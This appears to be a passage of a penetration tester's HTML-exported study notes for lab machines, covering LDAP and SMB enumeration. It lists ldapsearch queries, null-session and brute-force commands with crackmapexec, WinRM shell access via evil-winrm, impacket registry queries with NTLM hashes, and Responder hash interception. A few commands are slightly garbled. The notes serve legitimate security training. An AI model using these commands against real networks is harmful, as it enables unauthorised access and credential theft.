   authentication</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.8048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ldapsearch -h
   &lt;ip address&gt; -x</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Authenticate as
   user</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.8048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ldapsearch -h
   &lt;ip&gt; -x -D '&lt;user&gt;@&lt;domain&gt;' -w '&lt;password&gt;' -b
   'DC=something,DC=something'</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.3708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Retrieve naming
   contexts</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.8826in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>ldapsearch -h &lt;ip
         address&gt; -x -s base namingcontexts</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Output can be thought of
          folders and they are different types of folders</span></li>
     </ul>
    </ul>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.468in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Output all the
   LDAP information that can be queried</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.7854in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>ldapsearch -h &lt;ip
         address&gt; -x -b &quot;DC=&lt;Value&gt;,DC=&lt;Value&gt;&quot;</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>DC=values from output of
          &quot;Retrieving name contexts&quot; command</span></li>
      <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Use the top values in
           output(unconfirmed)</span></li>
      </ul>
     </ul>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Terms to grep for on this
         file (can be done instead of querying ldap for a term directly):</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>grep -i member</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>grep -i CN=</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>grep -i memberof</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>grep -i user</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>grep -i Pwd</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Look for anomalies in
          output</span></li>
      <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>cat &lt;ldap output
           file&gt; | awk '{print $1}' | sort | uniq -c | sort -nr</span></li>
      </ul>
     </ul>
    </ul>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.3708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Query LDAP </p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.8826in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>ldapsearch -h &lt;ip
         address&gt; -x -b &quot;DC=&lt;value&gt;,DC=&lt;value&gt;&quot;
         '&lt;Query to search&gt;'</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Queries to search:</span></li>
      <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>objectClass=Person</span></li>
       <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
        margin-bottom:0in'>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>pwdLastSet</span></li>
        <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:
         0in;margin-bottom:0in'>
         <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
             style='font-family:Calibri;font-size:11.0pt'>Convert to human
             readable using converter online</span></li>
         <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
          margin-bottom:0in'>
          <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><a
              href="https://www.epochconverter.com/ldap"><span
              style='font-family:Calibri;font-size:11.0pt'>https://www.epochconverter.com/ldap</span></a></li>
         </ul>
        </ul>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>sAMAccountName =
            username</span></li>
        <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:
         0in;margin-bottom:0in'>
         <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
             style='font-family:Calibri;font-size:11.0pt'>User is equivalent
             (not equivalent as a filter)</span></li>
        </ul>
       </ul>
      </ul>
     </ul>
    </ul>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.3708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Query LDAP with
   filters</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.8826in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>ldapsearch -h &lt;ip
         address&gt; -x -b &quot;DC=&lt;value&gt;,DC=&lt;value&gt;&quot;
         '&lt;Query to search&gt;' &lt;filter&gt;</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Can add more than 1
          filter </span></li>
      <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'><span
           style='mso-spacerun:yes'> </span>'&lt;Query to search&gt;
           &lt;filter 1&gt; &lt;filter 2&gt; &lt;filter 3&gt; ….</span><
li>
      </ul>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Filter examples</span></li>
      <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>sAMAccountName</span></li>
       <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
        margin-bottom:0in'>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>Retrieve all
            usernames.<span style='mso-spacerun:yes'>  </span>grep fo
            sAMAccountName to get list of usernames.</span></li>
        <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:
         0in;margin-bottom:0in'>
         <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
             style='font-family:Calibri;font-size:11.0pt'>Accounts with $ are
             machine generated.<span style='mso-spacerun:yes'>�
             </span>Passwords not crackable.</span></li>
         <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
             style='font-family:Calibri;font-size:11.0pt'>SM_<span
             style='mso-spacerun:yes'>  </span>and HealthMailbox account
s are
             Exchange related.<span style='mso-spacerun:yes'>  </span>Pa
sswords
             not crackable.</span></li>
        </ul>
       </ul>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Domain admins</span></li>
       <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
        margin-bottom:0in'>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>&quot;(&amp;(objectClass=user)(memberOf=CN=Domain
            Admins,CN=Users,DC=htb,DC=local))&quot;</span></li>
       </ul>
      </ul>
     </ul>
    </ul>
   </ul>
   </td>
  </tr>
 </table>
 </div>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.3777in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.3777in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>443 TCP /
HTTPS</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.3562in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Wednesday,
April 7, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>2:39
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:1.3284in'>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>See 80/HTTP</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:12.1229in'>

<div style='direction:ltr;margin-top:0in;margin-left:.2486in;width:2.1791in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>445 TCP /
SMB</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.2486in;width:2.343in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Sunday,
January 31, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>4:33
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:12.1229in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>SMB is the protocol, CIFS is
      an old dialect of SMB, and my is the Linux/Unix-like implementation of
      the SMB protocol.</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Try logging in as guest as
      well as null authentication</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Brute force usernames by
      themselves or with passwords</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>If errors with any<span
      style='mso-spacerun:yes'>  </span>smb command install: cifs-utils<
/span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>enum4linux &lt;ip&gt;</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Mounting SMB share</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Mount SMB Share</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.918in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <div style='direction:ltr'>
   <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:
    ltr;border-collapse:collapse;border-style:solid;border-color:#A3A3A3;
    border-width:1pt' title="" summary="">
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.7861in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create folder
     to mount to</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.9486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sudo mkdir
     /mnt/&lt;share folder&gt;</p>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.7666in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Mount share
     method 1</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.968in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sudo mount -t
     cifs -o vers=1.0 //10.11.1.136/'&lt;share name&gt;' /mnt/&lt;share
     folder&gt;</p>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>-o
          username=&lt;username&gt;,dir_mode=777,file_mode=666</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>-o
          username=&lt;username&gt;,uid=user,gid=group</span></li>
     </ul>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.7666in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Mount share
     method 2<br>
          - Windows credentials</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:6.0375in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sudo mount -t
     cifs -o 'user=&lt;user&gt;,password=&lt;password&gt;'
     //&lt;ip&gt;/&lt;share&gt; /mnt/&lt;share folder&gt;</p>
     </td>
    </tr>
   </table>
   </div>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.5069in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Unmount SMB Share
   (Forced &amp; Lazy)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.7666in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>umount -fl
   &lt;mounted share directory&gt;</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>crackmapexec</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.8027in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Check password
   policies</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>crackmapexec smb
   --pass-pol &lt;ip address&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.725in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Check password
   policies with null authentication</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.7347in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>crackmapexec smb
         --pass-pol &lt;ip address&gt; -u '' -p ''</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>This generally works on
          Domains from 2003.<span style='mso-spacerun:yes'>  </span>Newl
          installed domains do not like null authentication</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>If this works then note
          that null authentication allows domain enumeration and a lot of
          information can be found</span></li>
     </ul>
    </ul>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.8222in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate SMB
   Shares</p>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Attempt with non-existent
        username AND password</span></li>
   </ul>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.568in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>smb -u
   &lt;username&gt; -p &lt;password&gt; --shares</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.8027in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMB Brute force</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>smb -u
   &lt;username&gt; -p &lt;password&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.8027in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>WinRM Brute Force</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>winrm -u
   &lt;username&gt; -p &lt;password&gt;</p>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>If successful, get shell
        using evil-winrm</span></li>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.8027in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Crawl shares and
   output in json format<br>
      - Read output with jq . &lt;file&gt;</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-M spider_plus</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Query registry information -
      impacket-reg</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.9875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Query HKU</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.184in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'> </span>impacket-reg -hashes &lt;LM:NTLM has
hes&gt;
   &lt;domain&gt;/&lt;username&gt;@&lt;ip&gt; query -keyName HKU\\</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.0069in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Query HKLM</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.234in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'> </span>impacket-reg -hashes &lt;LM:NTLM has
hes&gt;
   &lt;domain&gt;/&lt;username&gt;@&lt;ip&gt; query -keyName HKLM\\</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Interestering registeries</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>HKU\Software</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Some software might store
        secrets in this directory</span></li>
   </ul>
  </ul>
 </ul>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Responder</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Intercept SMB logon
       requests and gain the hash to crack</span></li>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>smbpasswd</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5847in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Change user
   password</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9618in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>smbpasswd -U
   &lt;username&gt; -r &lt;domain or ip&gt;</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>nmap</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate share
   paths</p>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>May append a C: to the
        beginning even if it is a Linux host</span></li>
   </ul>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.118in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>nmap --script
   smb-enum-shares</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>smbmap:</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.6069in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>list smb
   shares<br>
      - Attempt with non-existent username</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.2597in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>smbmap –
 &lt;ip
   address&gt; -u &lt;username ex. guest&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Recursively
   show<span style='mso-spacerun:yes'>  </span>all files/shares</p
   </td>
